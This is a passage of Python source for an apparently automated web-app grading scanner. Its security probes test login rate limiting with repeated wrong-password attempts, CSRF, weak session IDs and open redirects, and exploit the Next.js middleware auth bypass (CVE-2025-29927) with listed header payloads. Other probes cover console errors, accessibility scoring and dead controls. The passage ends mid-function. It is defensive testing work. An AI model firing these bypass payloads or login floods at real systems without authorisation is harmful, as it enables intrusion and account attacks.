        return bool(_AUTH_REJECT.search(resp.text[:20000]))
    except Exception:
        return False


def login_no_rate_limit(ctx, probe) -> bool | None:
    """Self-as-oracle: fire N wrong-password logins at the login form; slop if NONE is throttled
    (HTTP 429/423). With no brute-force protection every attempt returns the same auth-failure status,
    enabling credential stuffing / password spraying. Uses its own username so a per-account lockout
    can't collide with other probes that hit /login (e.g. sqli_auth_bypass). N/A when no login form, or
    when the endpoint never returns an auth-shaped rejection (no real server auth to rate-limit)."""
    form = auth.login_form(ctx.profile.forms)
    if form is None or (form.method or "post").lower() == "get":
        # No HTML login form, OR a GET-method one: a GET 'login form' carries creds in the query string and
        # is not the credential-processing POST endpoint this probe models (on an SPA it is an onSubmit stub
        # whose real login is a JSON fetch). Either way, try a JSON login endpoint instead of GET-fetching.
        return _login_rate_limit_json(ctx, probe)
    data = {}
    for name in form.fields:
        low = name.lower()
        if "pass" in low:
            data[name] = "hl-wrong-password"
        elif "email" in low or "mail" in low:
            data[name] = "hacklet_probe_rl@example.com"
        else:
            data[name] = "hacklet_probe_rl"
    attempts = probe.probe.get("attempts", 10)
    saw_auth = False
    with httpx.Client(base_url=ctx.base_url, timeout=15.0, follow_redirects=False) as c:
        for n in range(attempts):
            try:
                resp = c.request((form.method or "post").upper(), form.action, data=data)
            except (httpx.HTTPError, httpx.InvalidURL):
                return None  # login endpoint unreachable -> couldn't test
            if resp.status_code in (429, 423):
                ctx.evidence.update(throttled=True, after_attempts=n + 1)
                return False  # throttled -> brute-force protection present -> clean
            saw_auth = saw_auth or _looks_like_auth_reject(resp)
    if not _endpoint_is_live(ctx, ctx.client, form.action, form.method or "post", resp):
        return None  # the login endpoint is a catch-all phantom (root or per-prefix) -> nothing to rate-limit
    if not saw_auth:
        return None  # no attempt looked like a real auth rejection -> client-side / static / platform login,
                     # no server auth of the app's to rate-limit (a phantom finding otherwise)
    ctx.evidence.update(throttled=False, attempts=attempts, via="html-form",
                        repro=_repro_from_resp(resp, matched="no 429/423 after %d wrong-password logins" % attempts))
    return True  # N attempts, never throttled -> no rate limiting -> slop


def _login_rate_limit_json(ctx, probe) -> bool | None:
    """JSON-API fallback for login_no_rate_limit: find a JSON login endpoint (Juice Shop /rest/user/
    login, /api/login, ...) and hammer it with wrong creds. N/A when no JSON login endpoint responds."""
    attempts = probe.probe.get("attempts", 10)
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=False) as c:
        # anchor the GUESSED login paths under the app, not the origin: on a sub-path deployment the
        # origin belongs to the host (or another app), and a finding there is not about this submission.
        path, creds, first = auth.find_json_login(c, root=_landing(ctx))
        if path is None:
            return None  # no login surface at all -> couldn't test
        if first.status_code in (429, 423):
            ctx.evidence.update(throttled=True, after_attempts=1, via="json-login")
            return False  # already throttling
        for _ in range(attempts - 1):  # find_json_login already made the first attempt
            try:
                r = c.post(path, json=creds)
            except (httpx.HTTPError, httpx.InvalidURL):
                return None
            if r.status_code in (429, 423):
                ctx.evidence.update(throttled=True, via="json-login")
                return False
    ctx.evidence.update(throttled=False, attempts=attempts, via="json-login",
                        repro=_repro("POST", ctx.base_url.rstrip("/") + path, body=json.dumps(creds),
                                     matched="no 429/423 after %d attempts" % attempts))
    return True


# Redirect destinations that signal a CSRF REJECTION (request not honored) rather than acceptance.
_CSRF_REJECT_HINTS = ("login", "signin", "sign-in", "sign_in", "auth", "error",
                      "denied", "forbidden", "unauthorized")


_CSRF_SKIP = ("login", "signin", "sign-in", "sign_in", "log-in", "logout", "logoff",
              "search", "query", "register", "signup", "sign-up")
_CSRF_STATE = ("password", "passwd", "pwd", "email", "delete", "remove", "update", "change",
               "settings", "profile", "transfer", "role", "account", "new_", "edit", "save", "admin")


def _is_login_form(action_low: str, fields_low: str) -> bool:
    """A plain authentication form (username/email + password, no change/reset indicator) — its cross-
    site submission is login-CSRF (a distinct, lesser issue), not the state-change CSRF we grade."""
    has_pw = "pass" in fields_low
    has_user = any(h in fields_low for h in ("user", "email", "login"))
    changes = any(h in action_low + " " + fields_low
                  for h in ("new", "change", "update", "confirm", "reset", "current", "old"))
    return has_pw and has_user and not changes


# ---- sec-authbypass-001: Next.js middleware auth-gate bypass (CVE-2025-29927) ------------------------------
_MW_HDR = "x-middleware-subrequest"
# version-spread payloads: Next 14/15 count colon-separated depth (5x exceeds MAX_RECURSION_DEPTH); 12.2+ take
# a bare 'middleware'/'src/middleware'; 11-12.2 the older 'pages/_middleware'. A PATCHED Next (>=14.2.25 /
# 15.2.3) ignores every one, so the gate never flips -> clean. The flip IS the proof; no version guess needed.
_MW_PAYLOADS = (
    "middleware",
    "src/middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
    "pages/_middleware",
)
# routes a Next app commonly gates behind middleware auth (tested IN ADDITION to whatever discovery found)
_MW_ROUTE_HINTS = ("/dashboard", "/admin", "/account", "/settings", "/profile", "/app/dashboard",
                   "/api/me", "/api/user", "/api/hello", "/api/admin", "/api/private")
_MW_MAX_GATED = 4                  # stop after testing this many genuinely-gated routes (bound the work)
_MW_LOGIN_BODY = re.compile(r'type=["\']?password|name=["\']?password|sign[\s-]?in|log[\s-]?in\b', re.I)


def _nextjs_signal(ctx) -> bool:
    """A Next.js fingerprint — x-middleware-subrequest is Next-specific, so gate the probe to Next apps
    (elsewhere it is an ignored header and a fire would be meaningless)."""
    with contextlib.suppress(Exception):
        r = ctx.client.get(_at(ctx, "/"))
        if "next" in r.headers.get("x-powered-by", "").lower():
            return True
        if "/_next/" in (r.text[:200000] or ""):
            return True
    return any("/_next/" in (rt or "") for rt in getattr(ctx.profile, "routes", None) or [])


def _is_auth_gate(resp) -> bool:
    """True when `resp` BLOCKS an anonymous request to a protected route — 401/403, a redirect to a login
    page, or a body that IS a login page / an 'unauthorized' answer. Requests are made follow_redirects=False
    so the raw gate (a 3xx) stays visible instead of the 200 login page it would land on."""
    if resp is None:
        return False
    sc = resp.status_code
    if sc in (401, 403):
        return True
    if sc in (301, 302, 303, 307, 308):
        return any(h in resp.headers.get("location", "").lower() for h in _CSRF_REJECT_HINTS)
    if sc == 200:
        with contextlib.suppress(Exception):
            body = resp.text[:8000]
            return bool(_MW_LOGIN_BODY.search(body) or _AUTH_REJECT.search(body))
    return False


def middleware_auth_bypass(ctx, probe) -> bool | None:
    """CVE-2025-29927: Next.js middleware enforces the route's auth gate, but the `x-middleware-subrequest`
    header makes Next believe the request already ran middleware, so it SKIPS it. Find a route the app GATES
    for an anonymous user (baseline -> 401/403 or redirect-to-login), then re-request it WITH the bypass
    header: if the gate OPENS (a 200 that is NOT itself the login/unauthorized page — the handler ran), the
    middleware auth is bypassable. Provable differential (hard-block -> success); a patched Next ignores the
    header so the gate never flips -> clean, and it is version-independent (the flip is the proof, not a
    version guess). N/A on non-Next apps and on apps with no gated route to bypass."""
    if not _nextjs_signal(ctx):
        ctx.evidence["na_reason"] = "not a Next.js app — the x-middleware-subrequest header is Next-specific"
        return None
    cand = [r.split("?")[0].rstrip("/") or "/" for r in (getattr(ctx.profile, "routes", None) or [])
            if r not in ("", "/")]
    cand = [c for c in cand if not c.startswith(("/_next/", "/static/", "/assets/"))
            and not c.lower().endswith((".js", ".mjs", ".css", ".png", ".jpg", ".jpeg", ".svg", ".ico",
                                        ".map", ".woff", ".woff2", ".json", ".txt"))]
    cand = list(dict.fromkeys(cand + list(_MW_ROUTE_HINTS)))
    gated = 0
    # anonymous client (drop any ctx.headers session -> a real unauth baseline) + no redirect-follow, so a
    # 3xx gate stays a visible 3xx instead of resolving to the 200 login page.
    with make_client(ctx.base_url, None, timeout=12.0, follow_redirects=False) as anon:
        for path in cand:
            if gated >= _MW_MAX_GATED:
                break
            try:
                base = anon.get(path)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if not _is_auth_gate(base):
                continue                       # not a protected route (or unreachable) -> nothing to bypass here
            gated += 1
            for val in _MW_PAYLOADS:
                try:
                    byp = anon.get(path, headers={_MW_HDR: val})
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                # BYPASS: the gate is gone -> a 200 that is NOT a login/unauthorized page (the handler ran)
                if byp.status_code == 200 and not _is_auth_gate(byp):
                    ctx.evidence.update(bypassed=True, route=path, header=_MW_HDR, payload=val,
                                        baseline_status=base.status_code)
                    return True
    ctx.evidence.update(bypassed=False, gated_routes_tested=gated)
    if gated == 0:
        ctx.evidence["na_reason"] = "no auth-gated route found (nothing for the bypass header to open)"
        return None
    return False


def _csrf_candidates(profile):
    """State-changing forms that carry NO anti-CSRF token: a POST, or a form whose action/fields name a
    state change (email/delete/settings/...). Login/search/logout/register are excluded — and so is a
    password-CHANGE form: submitting it would reset (and lock out) the grader's own session. CSRF is
    still detected via the app's other tokenless state-changers (guestbook/comment/settings)."""
    out = []
    for f in profile.forms:
        low, fields_low = f.action.lower(), " ".join(f.fields).lower()
        if any(h in low for h in _CSRF_SKIP) or _is_login_form(low, fields_low) \
                or auth.is_password_change_form(f):
            continue
        if ((f.method or "get").lower() == "post" or any(h in low + " " + fields_low for h in _CSRF_STATE)) \
                and not any(auth.is_csrf_field(x) for x in f.fields):
            out.append(f)
    return out


def _same_resource_redirect(from_url: str, location: str) -> bool:
    """A redirect that just NORMALIZES the same resource — http->https upgrade, www, a trailing slash — so the
    app never processed the request. NOT the acceptance of a cross-site state change (the dominant CSRF FP: a
    cross-site POST to an http:// URL gets a 308 to https and was counted as 'accepted')."""
    if not location:
        return False
    try:
        a = urllib.parse.urlsplit(from_url)
        b = urllib.parse.urlsplit(urllib.parse.urljoin(from_url, location))
    except ValueError:
        return False
    same_path = (a.path.rstrip("/") or "/") == (b.path.rstrip("/") or "/")
    same_host = a.netloc.lower().removeprefix("www.") == b.netloc.lower().removeprefix("www.")
    return same_path and same_host   # scheme may differ (http->https); same resource -> transport redirect only


def csrf_missing(ctx, probe) -> bool | None:
    """A state-changing request accepted cross-site with no CSRF token and no SameSite cookie -> no
    CSRF defense. Works with a provided --header session OR a self-registered one. Skips forms that
    carry a token; in self-register mode also skips a SameSite session (both valid defenses). N/A when
    there's no candidate form or no session to test with."""
    candidates = _csrf_candidates(ctx.profile)
    if not candidates:
        # `csrf` recorded no reason at all on the v11 corpus, so its 1.8%-ran rate was undiagnosable — the same
        # bare-None problem the session cluster needed two extra runs to escape.
        ctx.evidence["na_reason"] = ("no candidate form: every state-changing form either already carries a "
                                     "CSRF token or none was discovered (%d form(s) in the surface)"
                                     % len(ctx.profile.forms or []))
        return None
    account = None
    if ctx.headers:                                   # grade the authenticated surface as the given user
        client = make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=False)
    else:                                             # open-registration app: be our own user
        account = ctx.register(suffix="_csrf")
        if account is None:
            ctx.evidence["na_reason"] = ("a candidate form exists but no session could be established to submit "
                                         "it as — self-registration failed and no --header/--login session was "
                                         "supplied" + _browser_lane_detail())
            return None
        cookie = auth.session_cookie(account.register_response)
        if cookie is not None and cookie["samesite"]:
            account.client.close()
            ctx.evidence.update(vulnerable=False, defense="samesite-cookie")
            return False  # a SameSite session blocks cross-site sending -> already defended
        client = account.client
    try:
        real_tested = 0
        for form in candidates:
            method = (form.method or "post").upper()
            if method in ("GET", "HEAD", "OPTIONS"):
                # NOT because CSRF is POST-only — a state-changing GET (GET /delete?id=) IS a real, easier CSRF.
                # But a GET is UN-ADJUDICABLE black-box: a differing 200 could be a mutation OR a search/filter
                # (a read), indistinguishable from outside, and a GET redirect is navigation. So a GET form gives
                # no reliable 'state change accepted' signal -> skip it. The missed state-changing-GET is the
                # accepted FN (SameSite=Lax, the browser default, already blocks the <img>-based GET-CSRF it needs).
                continue
            data = {f: ("password" if "pass" in f.lower() else "hl-csrf") for f in form.fields}
            kw = {"params": data} if method == "GET" else {"data": data}
            try:
                resp = client.request(method, form.action, headers={"Origin": "https://evil.example"},
                                      follow_redirects=False, **kw)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if not _endpoint_is_live(ctx, client, form.action, method, resp):
                continue  # a catch-all phantom endpoint (root or per-prefix) -> nothing really accepted it
            real_tested += 1
            if resp.is_redirect:
                loc = resp.headers.get("location", "")
                # a redirect to login/auth/error is a CSRF REJECTION, not an accepted state change
                if any(h in loc.lower() for h in _CSRF_REJECT_HINTS):
                    continue
                # a transport/normalization redirect (http->https, www, trailing slash) never processed the
                # request -> not acceptance (the dominant FP: a cross-site POST to an http:// URL -> 308 https)
                if _same_resource_redirect(str(resp.url), loc):
                    continue
                ctx.evidence.update(vulnerable=True, form=form.action, method=method, status=resp.status_code)
                return True
            if resp.status_code < 400:
                # a 2xx that just returns the served PAGE isn't a state change — an SPA answers 200 with its
                # shell to ANY method/route (a form whose action defaults to '/'). Require the accepted response
                # to DIFFER from a plain GET of the same path; near-identical HTML => the shell, not a mutation.
                if "html" in resp.headers.get("content-type", "").lower():
                    try:
                        page = client.get(form.action)
                        if abs(len(resp.text) - len(page.text)) < max(96, int(len(page.text) * 0.02)):
                            continue   # response ≈ the served page -> SPA shell, not a real cross-site state change
                    except (httpx.HTTPError, httpx.InvalidURL):
                        pass
                ctx.evidence.update(vulnerable=True, form=form.action, method=method, status=resp.status_code,
                                    repro=_repro_from_resp(resp, matched="cross-site %s accepted with no CSRF token" % method))
                return True  # state-changing, no token, accepted cross-site AND response differs from the page -> CSRF
        ctx.evidence.update(vulnerable=False, forms_tested=real_tested)
        return False if real_tested else None  # every candidate was a phantom shell -> couldn't test -> N/A
    finally:
        if account is not None:
            account.client.close()
        else:
            client.close()


def _set_cookie_values(resp):
    out = []
    for raw in resp.headers.get_list("set-cookie"):
        first = raw.split(";", 1)[0]
        if "=" in first:
            name, val = first.split("=", 1)
            out.append((name.strip(), val.strip()))
    return out


def _weak_token(values) -> bool:
    """A session token is weak if it's too short, a short numeric counter/timestamp, or sequential."""
    distinct = [v for v in dict.fromkeys(values) if v]
    if not distinct:
        return False
    if all(len(v) <= 8 for v in distinct):
        return True                                     # < ~48 bits -> brute-forceable
    numeric = [v for v in distinct if v.isdigit()]
    if len(numeric) == len(distinct):                   # every token is purely numeric
        if all(len(v) <= 12 for v in distinct):
            return True                                 # a short numeric counter / timestamp
        if len(numeric) >= 3:
            ints = sorted(int(v) for v in numeric)
            if all(0 < ints[i + 1] - ints[i] <= 5 for i in range(len(ints) - 1)):
                return True                             # sequential -> the next id is guessable
    return False


def weak_session_id(ctx, probe) -> bool | None:
    """Weak / predictable session identifiers: collect the session tokens the app issues (across fresh,
    cookieless requests) plus any provided one, and flag short / purely-numeric / sequential values. A
    strong random token (long, mixed alphabet) reads clean. N/A when no session token is observed."""
    samples: dict[str, list] = {}

    def add(name, val):
        if auth._is_session_cookie(name):
            samples.setdefault(name, []).append(val)

    routes = ["/"] + [r for r in ctx.profile.routes
                      if re.search(r"session|login|token|weak|sess|auth", r, re.IGNORECASE)]
    for route in list(dict.fromkeys(routes))[:6]:
        for _ in range(8):
            with make_client(ctx.base_url, ctx.headers, timeout=8.0, follow_redirects=True) as c:
                try:
                    resp = c.get(route)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                for name, val in _set_cookie_values(resp):
                    add(name, val)
    for hv in [v for k, v in (ctx.headers or {}).items() if k.lower() == "cookie"]:
        for part in hv.split(";"):
            if "=" in part:
                add(part.split("=", 1)[0].strip(), part.split("=", 1)[1].strip())
    if not samples:
        ctx.evidence["na_reason"] = ("no Set-Cookie session token observed across %d route(s) — the app issues "
                                     "no cookie session to sample (token auth, or auth entirely off-origin)"
                                     % len(list(dict.fromkeys(routes))[:6]))
        return None
    weak = any(_weak_token(vals) for vals in samples.values())
    ctx.evidence.update(weak=weak, cookies=list(samples.keys()),
                        samples=sum(len(v) for v in samples.values()))
    return True if weak else False


def dom_xss(ctx, probe) -> bool:
    """Browser oracle: inject an executing payload across discovered routes and render — fires when
    it runs in the DOM, catching reflected-that-executes and DOM-sink XSS a source check misses.
    Gated on the `browser` capability, so it's N/A unless the run enabled rendering."""
    executed = browser.dom_xss_executes(ctx.base_url, ctx.profile.routes, headers=ctx.headers)
    ctx.evidence.update(executed=bool(executed), execution_confirmed=bool(executed), routes_rendered=len(ctx.profile.routes))
    return executed


def _served(ctx, path: str) -> bool:
    """Does the target path exist (not 404)? Lets a probe fall back from a declared endpoint a real
    target doesn't serve to a representative one (the homepage), instead of silently no-opping."""
    try:
        return ctx.client.get(path).status_code != 404
    except (httpx.HTTPError, httpx.InvalidURL):
        return False




def _shell_ok(ctx) -> bool:
    """Whether the perf probes should AWAIT a Streamlit render: only if discovery didn't already find the app
    dead (render_state error/stuck). Skipping a known-dead app stops each perf probe re-waiting ~12s on an app
    that will never paint (which stacked up across render_metrics/web_vitals/FCP and DNF'd stuck Streamlit apps
    on the grade timeout). A rendered app (or a non-Streamlit one) still awaits/normal-renders."""
    return getattr(getattr(ctx, "profile", None), "render_state", None) not in ("error", "stuck")




_CONSOLE_INTACT_SCALE = 0.4   # an uncaught error that DIDN'T visibly break the render is a real defect but not
                              # a functional break -> scaled below the ceiling (the flat 22 over-fired on these)
_CONSOLE_MIN_CONTENT = 50     # visible body text below this (+ an error) reads as a near-empty/degraded render


def _console_broken_render(res: dict) -> bool:
    """Did the uncaught error visibly BREAK the render? True on a framework crash overlay/message or a
    near-empty body. A FULL white-screen is already DNF'd upstream (functional=False), so the live zone here
    is PARTIAL breakage — the app rendered but shows a crash / lost a region."""
    if res.get("error_overlay"):
        return True
    cl = res.get("content_len")
    return cl is not None and cl < _CONSOLE_MIN_CONTENT


def console_errors_present(ctx, probe) -> bool:
    """Browser oracle: the app's OWN code fails on load -- an uncaught JavaScript throw (pageerror), OR a
    console.error the throw hook misses: a CSP that blocks its own resource, or a React hydration mismatch
    (v2.0 Family 3 widening). A third-party widget throwing (cross-origin, browser-sanitized to "Script error.")
    is common on working apps and does NOT count -- only first-party failures are the team's durability defect.
    The penalty is SCALED by render impact (see _console_broken_render): full when it visibly broke the page,
    reduced when the app rendered fine despite it (a real but non-fatal defect). Browser-gated."""
    url = ctx.base_url.rstrip("/") + _home_path(ctx, probe)
    res = browser.console_errors(url, headers=ctx.headers)
    if res is None:
        return False   # no browser / render failed -> can't test (browser-gated)
    ctx.evidence.update(js_errors=res["total"], first_party=res["first_party"],
                        third_party=res["third_party"], sources=res.get("sources"),
                        engine="pageerror+console")
    if res["first_party"] <= 0:
        return False
    broken = _console_broken_render(res)
    # A console-sourced failure (a self-blocking CSP / a React hydration mismatch) is a weaker, flakier signal
    # than an uncaught throw, so it counts ONLY when it VISIBLY broke the render (error overlay / near-empty
    # body). A pageerror throw is high-confidence and fires regardless (scaled down on an intact render). This
    # also neutralizes a flaky hydration error that didn't break anything -> it won't fire.
    pe_fp = (res.get("sources") or {}).get("pageerror", res["first_party"])
    if pe_fp <= 0 and not broken:
        return False
    ctx.evidence.update(content_len=res.get("content_len"), error_overlay=bool(res.get("error_overlay")),
                        render_broken=broken,
                        penalty_override=probe.penalty if broken else max(1, round(probe.penalty * _CONSOLE_INTACT_SCALE)))
    return True


_A11Y_TIER = {"critical": 20, "serious": 12, "moderate": 7, "minor": 3}


def _contrast_penalty(shortfall: float) -> float:
    """The CONTINUOUS color-contrast penalty from the shortfall (measured/required), replacing the 4 discrete
    bands: piecewise-linear through the WCAG-anchored tier points (0.30->20 critical, 0.50->12 serious,
    0.75->7 moderate, 1.0->3 minor), flat 20 below 0.30 (effectively invisible). De-quantizes the largest single
    flattening in a11y (contrast fires on ~55% of the corpus) WITHOUT moving the tier magnitudes -- a value at a
    band boundary scores exactly what it did before, only the between-boundary values now vary."""
    pts = ((0.30, 20.0), (0.50, 12.0), (0.75, 7.0), (1.0, 3.0))
    if shortfall <= pts[0][0]:
        return pts[0][1]
    for (x0, y0), (x1, y1) in zip(pts, pts[1:]):
        if shortfall <= x1:
            return round(y0 + (y1 - y0) * (shortfall - x0) / (x1 - x0), 1)
    return pts[-1][1]
# RE-PRICED off v11 (1,531 scored apps), because one category had become a third of the whole measurement.
# Measured shares of total corpus penalty at the old 30/18/10/4: accessibility 34.0%, security-headers 24.4%,
# web-vitals 10.4%. a11y fired on 73.6% of apps and was the largest single term in the score by a wide margin.
#
# The sharpest anomaly was the ratio, not the absolute value: a single CRITICAL barrier cost 30 against a
# security ceiling of 40, so a missing alt attribute was priced at three quarters of a SQL injection. At 20 it
# is exactly half the ceiling, which is defensible — a11y EXCLUDES users, injection COMPROMISES them.
#
# Modelled against every recorded `impacts` map in the v11 corpus before changing anything:
#     30/18/10/4 -> 34.0%   median hit 29   max 65   (was)
#     24/14/ 8/3 -> 28.7%   median hit 22   max 52
#     20/12/ 7/3 -> 25.5%   median hit 19   max 44   (chosen)
#     18/11/ 6/2 -> 23.8%   median hit 18   max 39
#     15/ 9/ 5/2 -> 20.3%   median hit 14   max 33
#
# THIS IS A RELATIVE CORRECTION, NOT LENIENCY, and the distinction matters because the opposite change was
# proposed once and was wrong. Hygiene stays in the number on purpose: the score is named for AI slop, a 0 must
# mean "you even nailed the boring hygiene", and apps that fail it are not to be coddled. What is being fixed is
# that a single category dominating a third of the variance drowns out the other 89 probes. a11y remains the
# second-largest category (25.5% against headers' 24.4%) and a barred app still pays.
_A11Y_DECAY = 0.6   # SAME within-category diminishing-returns constant as aggregate.CATEGORY_DECAY: each
                    # additional barrier adds less MARGINAL exclusion (populations overlap; a multi-barrier
                    # app is already substantially unusable) -> a11y stacks like every other category, not raw
# a no-browser static hard-fail -> the axe impact of the equivalent rule, so a11y-002's SUM uses the same
# tiers as a11y-001 (the two probes are one logical flaw, one static one rendered).
_STATIC_A11Y_IMPACT = {"missing-lang": "serious", "img-missing-alt": "critical", "missing-title": "serious",
                       "control-no-accessible-name": "critical", "low-contrast": "serious"}


def _a11y_penalty(impacts: dict, contrast_pen: float | None = None) -> float:
    """Diminishing-returns sum of the a11y penalty: each DISTINCT violated rule contributes its impact tier,
    but the worst counts FULL and each additional decays by _A11Y_DECAY (sorted desc) — the SAME damper every
    other multi-finding category gets. a11y was the lone raw-SUM category, which let barriers stack to a
    runaway tail (one app hit 150, 2.5x the security ceiling); the damper caps the worst at ~65 while leaving
    single-/few-barrier apps untouched. Still ADDITIVE across orthogonal populations (2 barriers > 1: a
    contrast miss blocks low-vision, a missing label blocks screen-readers), just with decreasing MARGINAL
    harm — the 6th barrier adds less new exclusion than the 1st (populations overlap; the app is already
    largely unusable). `impacts` counts RULES not nodes (a systematic issue across 50 buttons is one barrier).
    Tiers aim weight at exclusion over cosmetics; the live values are _A11Y_TIER (currently critical 20 >
    serious 12 > moderate 7 > minor 3) — read them there rather than here, because this sentence spelled out
    the PRE-re-price 30/18/10/4 for as long as it took someone to notice."""
    tiers = [_A11Y_TIER.get(level, _A11Y_TIER["minor"])
             for level, n in impacts.items() for _ in range(n)]
    if contrast_pen is not None:
        tiers.append(contrast_pen)   # the CONTINUOUS color-contrast barrier (a float shortfall penalty, not a tier)
    tiers.sort(reverse=True)
    return round(sum(v * (_A11Y_DECAY ** i) for i, v in enumerate(tiers)), 1)   # 1-decimal, like the score


_CONTRAST_BANDS = ((0.30, "critical"), (0.50, "serious"), (0.75, "moderate"), (1.01, "minor"))


def _contrast_level(contrast: list):
    """Grade a color-contrast violation by HOW unreadable it is -> (level, worst_shortfall).

    axe fixes this rule's impact at "serious" however bad the text is, so 4.4:1 (a hair under the bar) and
    1.1:1 (invisible) arrive identical and are charged identically. That is the largest single flattening in
    the score: color-contrast fires on 55.1% of the corpus and is involved in 14.3% of ALL penalty.

    The measure is SHORTFALL = measured / required, not the raw ratio, because WCAG asks 4.5:1 of body text
    but only 3:1 of large text. The same ratio is a different failure at a different size — which is the
    whole reason WCAG relaxes the bar for large glyphs, and #949494 on white demonstrates it: 3.03:1, a
    violation as body text, not a violation as a heading.

    Bands are anchored to WCAG first, then CHECKED against the corpus (60 apps that fired the rule, 347
    failing nodes) rather than fitted to it:
      >= 0.75  minor     body text at >= 3.4:1, which CLEARS the 3:1 large-text bar — readable, and failing
                         only the stricter rule that applies at its size          (33.9% of sampled apps)
      >= 0.50  moderate  below both bars, still perceptible                                       (44.1%)
      >= 0.30  serious   substantially unreadable                                                 (18.6%)
      <  0.30  critical  under a third of the required ratio; effectively invisible                (3.4%)

    Graded on the WORST node, consistent with the rest of a11y (one unlabeled button is a whole barrier, not
    a fraction of one) and safe here because we ingest axe's `violations` only: a node whose background axe
    could not resolve is filed `incomplete` and never reaches us. That excludes the classic contrast false
    positives — text over images, gradients, unresolved alpha — by construction rather than by heuristic.

    None when no node carried a usable ratio, which leaves axe's own impact in place rather than guessing."""
    shortfalls = [c["ratio"] / c["required"] for c in contrast
                  if c.get("required") and isinstance(c.get("ratio"), (int, float))]
    if not shortfalls:
        return None
    worst = min(shortfalls)
    for cut, level in _CONTRAST_BANDS:
        if worst < cut:
            return level, worst
    return "minor", worst


_A11Y_SCORED_TAGS = frozenset(browser._AXE_WCAG_TAGS)   # WCAG 2 A/AA -> the SCORED set; everything else is advisory


def _a11y_scored(v: dict) -> bool:
    """A violation counts toward the SCORE iff it carries a scored WCAG 2 A/AA tag. The Family-2 candidates
    (WCAG 2.2 AA / best-practice only) are advisory. Missing tags -> scored, to preserve the pre-expansion set."""
    tags = set(v.get("tags") or [])
    return not tags or bool(tags & _A11Y_SCORED_TAGS)


def a11y_violations_present(ctx, probe) -> bool:
    """Browser oracle: WCAG 2 A/AA accessibility violations from axe-core (its deterministic `violations`
    set) above the threshold. Browser-gated; axe reports only algorithmically-determinable failures, so
    it stays intent-independent (the `incomplete`/needs-review rules are excluded). The penalty is a
    per-rule severity-tiered SUM (see _a11y_penalty) so a multi-barrier page outscores a single-barrier
    one and a lone cosmetic issue isn't charged the full exclusion penalty. The WCAG 2.2 / best-practice
    candidates ride along as OFF-SCORE `advisory_a11y` (v2.0 Family 2), for re-grade decorrelation analysis:
    they never touch the fire or the penalty until the corpus proves them decorrelated from this carrier."""
    url = ctx.base_url.rstrip("/") + _home_path(ctx, probe)
    viols = browser.a11y_violations(url, headers=ctx.headers)
    if viols is None:
        return False
    scored = [v for v in viols if _a11y_scored(v)]
    advisory = [v for v in viols if not _a11y_scored(v)]
    impacts: dict[str, int] = {}
    worst_shortfall = None
    contrast_pen = None
    for v in scored:
        level = v.get("impact")
        if v["id"] == "color-contrast":
            graded = _contrast_level(v.get("contrast") or [])
            if graded:
                _lvl, worst_shortfall = graded
                # CONTINUOUS contrast (not a discrete tier): the worst node's shortfall -> a float penalty,
                # kept OUT of the tier-count impacts so it enters the a11y sum as its own graded barrier.
                contrast_pen = max(contrast_pen or 0.0, _contrast_penalty(worst_shortfall))
                continue
        impacts[level] = impacts.get(level, 0) + 1
    ctx.evidence.update(violations=len(scored), rules=sorted({v["id"] for v in scored})[:15],
                        impacts=impacts, engine="axe-core", penalty_override=_a11y_penalty(impacts, contrast_pen))
    if worst_shortfall is not None:
        ctx.evidence["contrast_shortfall"] = round(worst_shortfall, 2)
    if advisory:   # OFF-SCORE: captured for the 2026.3 re-grade to measure decorrelation, never scored here
        adv_impacts: dict[str, int] = {}
        for v in advisory:
            adv_impacts[v.get("impact")] = adv_impacts.get(v.get("impact"), 0) + 1
        ctx.evidence["advisory_a11y"] = {
            "rules": sorted({v["id"] for v in advisory})[:20], "impacts": adv_impacts,
            "note": "v2.0 Family 2 candidate (wcag22aa / best-practice) -- OFF-SCORE, for re-grade decorrelation"}
    return len(scored) > probe.probe.get("threshold", 0)


_PRIMARY_CTA = ("submit", "save", "buy", "checkout", "pay", "order", "create", "sign up", "signup",
                "log in", "login", "send", "confirm", "add to cart", "place order", "subscribe", "register")


def dead_controls_present(ctx, probe) -> bool:
    """Browser oracle: clickable controls wired to nothing — clicking moves no channel (DOM / network /
    navigation / dialog / error). The AI-shell-app tell, the interactive analogue of a broken link.
    Browser-gated. The helper under-reports rather than over-reports (any observed motion clears a
    control), so a fired finding is high-confidence — we never penalize a working app whose effect we
    merely failed to observe."""
    url = ctx.base_url.rstrip("/") + _home_path(ctx, probe)
    dead = browser.inert_controls(url, headers=ctx.headers, max_controls=probe.probe.get("max_controls", 10))
    if dead is None:
        return False   # no browser / render failed -> inconclusive, not a false "clean"
    ctx.evidence.update(dead_controls=len(dead), labels=dead[:8],
                        primary_cta=any(any(k in (l or "").lower() for k in _PRIMARY_CTA) for l in dead))
    return len(dead) > probe.probe.get("threshold", 0)


# `redirect_uri` is THE OAuth/OIDC parameter name and was the whole reason sec-redirect-001 fired on
# GapBench's `open-redirect` scenario and stayed silent on `oauth-redirect`: same defect, different param.
# Adding names is free — every param rides in ONE request below — and cannot cost precision, because the
# verdict is "did Location's host become our foreign probe host", never "was the param accepted".
_REDIRECT_PARAMS = ("next", "url", "redirect", "return", "dest", "continue", "to", "r",
                    "redirect_uri", "redirect_url", "returnTo", "return_url", "callback_url")
_REDIRECT_PROBE_HOST = "hacklet-redirect-probe.example"
_REDIRECT_ENDPOINTS = ("/redirect", "/login", "/logout", "/go", "/out", "/auth/callback", "/sso",
                       "/oauth/authorize", "/oauth/callback")


def open_redirect(ctx, probe) -> bool:
    """A user-controlled redirect param that sends the browser to an arbitrary EXTERNAL host -> open
    redirect (phishing / OAuth-token theft). Intent-independent: fires only on a 3xx whose Location
    host is our foreign probe host. Tests discovered routes plus common redirect endpoints/params."""
    evil = {p: "https://" + _REDIRECT_PROBE_HOST + "/x" for p in _REDIRECT_PARAMS}
    seen = set()
    # discovered routes already carry full paths; the CONSTRUCTED guesses are relative to the app root, so
    # a sub-path deployment must be probed at /site/app/oauth/authorize, not at the origin's apex.
    guesses = [_at(ctx, p) for p in _REDIRECT_ENDPOINTS]
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=False) as c:
